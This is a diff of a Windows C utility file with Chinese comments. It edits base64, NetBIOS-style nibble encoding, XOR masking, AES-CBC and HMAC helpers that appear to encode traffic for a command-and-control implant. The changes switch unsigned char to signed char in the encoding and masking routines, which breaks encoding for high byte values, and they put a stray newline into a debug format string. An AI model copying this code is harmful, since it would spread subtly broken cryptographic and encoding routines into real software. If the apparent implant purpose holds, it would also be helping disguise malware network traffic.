@@ -2,7 +2,7 @@
 #include "Config.h"
 #pragma warning(disable:4996)
 
-extern unsigned char Hmackey[16];
+extern char hmackey[16];
 
 uint16_t Readshort(uint8_t* b) {
     return (uint16_t)b[0] << 8 | (uint16_t)b[1];
@@ -57,33 +57,6 @@ unsigned int GenerateRandomInt(int min, int max) {
     return randomInt;
 }
 
-uint8_t* CalcByte(uint8_t** arrays, size_t* sizes, size_t numArrays) {
-    size_t totalSize = 0;
-
-    // 计算总大小
-    for (size_t i = 0; i < numArrays; ++i) {
-        totalSize += sizes[i];
-    }
-
-	// 多分配一个字节用于结尾的 '\0'
-    uint8_t* result = (uint8_t*)malloc(totalSize); 
-
-    if (result == NULL) {
-		fprintf(stderr, "Memory allocation failed\n");
-        return NULL;
-    }
-
-    size_t offset = 0;
-
-    // 整合数据
-    for (size_t i = 0; i < numArrays; ++i) {
-        memcpy(result + offset, arrays[i], sizes[i]);
-        offset += sizes[i];
-    }
-
-    return result;
-}
-
 unsigned char* base64Encode(unsigned char* data, size_t data_length) {
     if (!data || data_length == 0) {
         fprintf(stderr, "Invalid input data or length\n");
@@ -98,12 +71,12 @@ unsigned char* base64Encode(unsigned char* data, size_t data_length) {
         NULL,
         &encodedLength))
     {
-        fprintf(stderr, "CryptBinaryToStringA (size calc) Failed With Error: %lu\n", GetLastError());
+        fprintf(stderr, "CryptBinaryToStringA (size calc) failed with error: %lu\n\n", GetLastError());
         return NULL;
     }
 
-    // 注意这里要用 char*
-    char* encodedData = (char*)malloc(encodedLength);
+    // 注意这里要用 unsigned char*
+    unsigned char* encodedData = (unsigned char*)malloc(encodedLength);
     if (!encodedData) {
         fprintf(stderr, "Memory allocation failed\n");
         return NULL;
@@ -116,7 +89,7 @@ unsigned char* base64Encode(unsigned char* data, size_t data_length) {
         encodedData,
         &encodedLength))
     {
-        fprintf(stderr, "CryptBinaryToStringA (encoding) Failed With Error: %lu\n", GetLastError());
+        fprintf(stderr, "CryptBinaryToStringA (encoding) failed with error: %lu\n\n", GetLastError());
         free(encodedData);
         return NULL;
     }
@@ -124,7 +97,7 @@ unsigned char* base64Encode(unsigned char* data, size_t data_length) {
     return (unsigned char*)encodedData;
 }
 
-unsigned char* NetbiosEncode(unsigned char* data, size_t data_length, unsigned char key, size_t* encoded_length) {
+unsigned char* NetbiosEncode(unsigned char* data, size_t data_length, char key, size_t* encoded_length) {
     if (data == NULL || data_length == 0) {
         return NULL;
     }
@@ -138,8 +111,8 @@ unsigned char* NetbiosEncode(unsigned char* data, size_t data_length, unsigned c
     *encoded_length = 0;
 
     for (size_t i = 0; i < data_length; ++i) {
-        unsigned char value = data[i];
-        unsigned char buf[2];
+        char value = data[i];
+        char buf[2];
 
         buf[0] = (value >> 4) + key;
         buf[1] = (value & 0xF) + key;
@@ -151,7 +124,7 @@ unsigned char* NetbiosEncode(unsigned char* data, size_t data_length, unsigned c
     return result;
 }
 
-unsigned char* NetbiosDecode(unsigned char* data, size_t data_length, unsigned char key ,size_t* NetbiosDecodelen) {
+unsigned char* NetbiosDecode(unsigned char* data, size_t data_length, char key ,size_t* NetbiosDecodelen) {
 
     for (int i = 0; i < data_length; i += 2) {
         data[i / 2] = ((data[i] - key) << 4) + ((data[i + 1] - key) & 0xf);
@@ -177,7 +150,7 @@ unsigned char* MaskEncode(unsigned char* data, size_t data_length, size_t* mask_
         return NULL;
     }
 
-    unsigned char key[4];
+    char key[4];
     for (int i = 0; i < 4; ++i) {
         key[i] = rand() & 0xFF;
     }
@@ -222,7 +195,7 @@ unsigned char* AesCBCEncrypt(unsigned char* rawData, unsigned char* key, size_t 
     DWORD cbData = 0, cbKeyObject = 0, cbCipherText = 0;
 
     // 初始化 IV
-    unsigned char IVA[16];
+    char IVA[16];
     memcpy(IVA, IV, 16);
 
     // 打开 AES 算法提供者
@@ -311,7 +284,7 @@ unsigned char* AesCBCEncrypt(unsigned char* rawData, unsigned char* key, size_t 
     }
 
     // 添加前置 16 字节的 ADD（全 0）
-    unsigned char ADD[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
+    char ADD[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
     memcpy(cipherText, ADD, 16);
 
     // 添加字符串结尾空字符
@@ -402,7 +375,7 @@ unsigned char* AesCBCDecrypt(unsigned char* encryptData, unsigned char* key, siz
         ULONG blockSize;
         if (BCRYPT_SUCCESS(BCryptGetProperty(hAlg, BCRYPT_BLOCK_LENGTH,
             (PUCHAR)&blockSize, sizeof(blockSize), &cbData, 0))) {
-            fprintf(stderr, "Block size: %lu, Data length: %zu\n", blockSize, dataLen);
+            fprintf(stderr, "Block size: %lu\n, Data length: %zu\n", blockSize, dataLen);
         }
         free(decryptData);
         BCryptDestroyKey(hKey);
@@ -465,7 +438,7 @@ unsigned char* HMkey(unsigned char* encryptedBytes, size_t encryptedBytesLen) {
     }
 
     // 创建 HMAC 哈希对象
-    status = BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, (PUCHAR)Hmackey, HMAC_KEY_LENGTH, 0);
+    status = BCryptCreateHash(hAlg, &hHash, pbHashObject, cbHashObject, (PUCHAR)hmackey, HMAC_KEY_LENGTH, 0);
     if (!BCRYPT_SUCCESS(status)) {
         fprintf(stderr, "BCryptCreateHash failed: %08x\n", status);
         free(pbHashObject);
